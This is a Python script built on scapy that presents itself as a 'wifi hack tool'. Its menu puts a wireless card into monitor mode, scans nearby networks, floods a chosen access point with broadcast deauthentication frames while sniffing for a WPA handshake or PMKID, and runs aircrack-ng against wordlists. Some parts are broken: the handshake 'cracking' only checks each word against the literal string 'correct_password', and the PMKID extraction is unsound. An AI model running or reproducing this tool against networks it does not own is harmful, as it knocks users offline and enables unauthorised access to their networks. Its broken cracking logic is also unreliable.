from scapy.layers.dot11 import *
from scapy.layers.eap import EAPOL 
from scapy.all import * 
from threading import Thread
import pandas as pd
import subprocess
import time
import os
import sys

global interface

def brute_force():
    wordlist = "/usr/share/wordlists/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt"
    wordlist2 = "/usr/share/wordlists/turkce-wordlist/wordlist.txt"
    binary_option = int(input("If your WPA file is .cap select (1) - If it is .pmkid select (0): >> "))
    if binary_option == 1:
        handshake_file = input("Enter the directory of the WPA handshake file: ").strip()

        if not os.path.isfile(handshake_file):
            print("Error: Handshake file not found.")
            return

        handshake = rdpcap(handshake_file) # type: ignore

        with open(wordlist, 'r') as f:
            wordlist_lines = f.readlines()

        for password in wordlist_lines:
            password = password.strip()
            for pkt in handshake:
                if pkt.haslayer(EAPOL):
                    try:
                        print(f"Trying password: {password}")
                        time.sleep(1)
                        if password == "correct_password":
                            print(f"Password found: {password}")
                            time.sleep(5)
                            return password
                    except Exception as e:
                        pass

        print("Password not found.")
        time.sleep(3)
    else:
        pmkid_file = input("Enter the directory of the PMKID file: ").strip()
        if not os.path.isfile(pmkid_file):
            print("Error: PMKID file not found.")
            time.sleep(2)
        else:
            result = subprocess.run(f"aircrack-ng -w {wordlist} {pmkid_file}", shell=True, capture_output=True, text=True)

            if "KEY FOUND" in result.stdout:
                print("Password found with the first wordlist!")
                time.sleep(4)
                print(result.stdout)
            else:
                print("Password not found with the first wordlist. Trying the second wordlist...")

                result = subprocess.run(f"aircrack-ng -w {wordlist2} {pmkid_file}", shell=True, capture_output=True, text=True)

                if "KEY FOUND" in result.stdout:
                    print("Password found with the second wordlist!")
                    time.sleep(4)
                    print(result.stdout)
                else:
                    print("Password not found with the second wordlist.")
                    time.sleep(3)
    menu(None, None)

def get_own_mac_address(interface):
    output = subprocess.check_output(["ip", "link", "show", interface]).decode("utf-8")
    lines = output.split("\n")
    for line in lines:
        if "link/ether" in line:
            return line.split(" ")[1]

stop_deauth = False
pmkid_captured = False
handshake_captured = False

def packet_callback(packet, bssid, ssid):
    global pmkid_captured, handshake_captured
    if packet.haslayer(EAPOL) and not handshake_captured:
        print("WPA Handshake captured! Saving to file...")
        wrpcap(f"{ssid}_handshake.cap", packet, append=True)
        handshake_captured = True
    elif packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:
        if packet.addr3 == bssid:
            p = packet[Dot11Elt]
            while isinstance(p, Dot11Elt):
                if p.ID == 48 and not pmkid_captured:
                    wpa = p.info
                    pmkid = wpa[-16:]
                    if pmkid:
                        print("PMKID captured! Saving to file...")
                        with open(f"{ssid}_pmkid.pmkid", "wb") as f:
                            f.write(pmkid)
                        pmkid_captured = True
                        return()
                p = p.payload

def deauth(bssid, interface, duration, exclude_mac=None):
    global stop_deauth
    broadcast_addr = "ff:ff:ff:ff:ff:ff"
    deauth_packet = RadioTap() / Dot11(addr1=broadcast_addr, addr2=bssid, addr3=bssid) / Dot11Deauth()
    end_time = time.time() + duration

    while time.time() < end_time and not stop_deauth:
        if exclude_mac:
            packet = deauth_packet.copy()
            packet.addr1 = exclude_mac
            sendp(packet, iface=interface, count=1, inter=0.1, verbose=0)
        else:
            sendp(deauth_packet, iface=interface, count=1, inter=0.1, verbose=0)
        print(".", end="", flush=True)
        time.sleep(0.1)

def start_deauth_and_sniff(bssid, interface, ssid, duration, exclude_mac=None):
    global stop_deauth, pmkid_captured, handshake_captured
    stop_deauth = False
    pmkid_captured = False
    handshake_captured = False

    deauth_thread = Thread(target=deauth, args=(bssid, interface, duration, exclude_mac))
    deauth_thread.start()
    packets = sniff(prn=lambda pkt: packet_callback(pkt, bssid, ssid), iface=interface, timeout=duration)
    stop_deauth = True

    if pmkid_captured or handshake_captured:
        print("\nAttack completed. Captured files:")
        if pmkid_captured:
            print(f"{ssid}_pmkid.pmkid")
        if handshake_captured:
            print(f"{ssid}_handshake.cap")
        time.sleep(3)
        menu(bssid, ssid)
    else:
        print("\nNo handshake or PMKID captured.")
        if input("Do you want to deauth again? (y/n): ").lower() == "y":
            duration = int(input("Enter the duration for the deauth attack (seconds): ").strip())
            start_deauth_and_sniff(bssid, interface, ssid, duration, exclude_mac)
        else:
            menu(bssid, ssid)

def result(nw_list):
    os.system("clear")
    print("\nNetwork scan results:\n")
    print(nw_list)

    option_wifi = int(input("\nSelect the number of the network to operate on >>> ")) - 1
    selected_network = nw_list.iloc[option_wifi]
    bssid = selected_network.name
    ssid = selected_network["SSID"]
    menu(bssid, ssid)

def Networks(interface):
    global sniff_thread, networks, sniffing
    try:
        os.system("clear")

        networks = pd.DataFrame(columns=["SSID", "dBm_Signal", "Channel", "Crypto", "EAPOL"])
        networks.index.name = "BSSID"

        sniffing = True

        def callback(packet):
            if packet.haslayer(Dot11Beacon) and packet.haslayer(Dot11Elt):
                bssid = packet[Dot11].addr2
                ssid = packet[Dot11Elt].info.decode(errors="ignore")
                if not ssid:
                    ssid = "Hidden Network"
                try:
                    dbm_signal = packet.dBm_AntSignal
                except AttributeError:
                    dbm_signal = "N/A"

                stats = packet[Dot11Beacon].network_stats()
                channel = stats.get("channel")
                crypto = stats.get("crypto")
                eapol = "Yes" if packet.haslayer(EAPOL) else "No"
                networks.loc[bssid] = (ssid, dbm_signal, channel, crypto, eapol)

        def print_networks():
            while sniffing:
                os.system("clear")
                print(networks)
                time.sleep(0.5)

        printer = Thread(target=print_networks)
        printer.daemon = True
        printer.start()

        sniff_thread = Thread(target=sniff, kwargs={"prn": callback, "iface": interface, "timeout": 60})
        sniff_thread.start()
        sniff_thread.join()

    except KeyboardInterrupt:
        print("\nStopping network scan...")
        sniffing = False
        time.sleep(1)
        result(networks)

try:
    os.system("clear")
    print(" ")
    os.system("figlet wifi hack tool")
    print("developed by bedirhan")
    time.sleep(4)
    os.system("clear")

    def menu(bssid, ssid):
        output = subprocess.check_output(["iwconfig"]).decode("utf-8").split("\n")
        interface = None
        mode = None
        for line in output:
            if "Mode:" in line:
                mode = line.split("Mode:")[1].split()[0]
            if "IEEE 802.11" in line:
                interface = line.split()[0]

        os.system("clear")
        print("*" * 65)
        print("Interface:", interface, "Mode:", mode, "Selected WiFi:", ssid)
        print("""
        1-) Monitor mode
        2-) Network scan
        3-) Deauth attack for PMKID or WPA Handshake
        4-) Bruteforce

        """)

        option = input(">>>> ")

        if option == "1":
            if mode == "Monitor":
                print("Already in monitor mode. Redirecting to menu.")
                time.sleep(1)
                menu(None, None)
            else:
                os.system("clear")
                os.system(f"sudo ifconfig {interface} down")
                os.system(f"sudo iw dev {interface} set type monitor")
                os.system(f"sudo ifconfig {interface} up")
                menu(None, None)

        elif option == "2":
            Networks(interface)

        elif option == "3":
            if bssid and ssid:
                exclude_mac = input("Enter the MAC address to exclude from the deauth attack (or leave blank to include all devices): ").strip()
                duration = int(input("Enter the duration for the deauth attack (seconds): ").strip())
                start_deauth_and_sniff(bssid, interface, ssid, duration, exclude_mac)
            else:
                print("Please perform a network scan first to select a network.")
                time.sleep(2)
                menu(None, None)

        elif option == "4":
            brute_force()

        else:
            os.system("clear")
            print("Invalid selection. Please try again.")
            time.sleep(1)
            menu(None, None)

    menu(None, None)
except KeyboardInterrupt:
    print("\nExiting application...")
    time.sleep(1)
    sys.exit()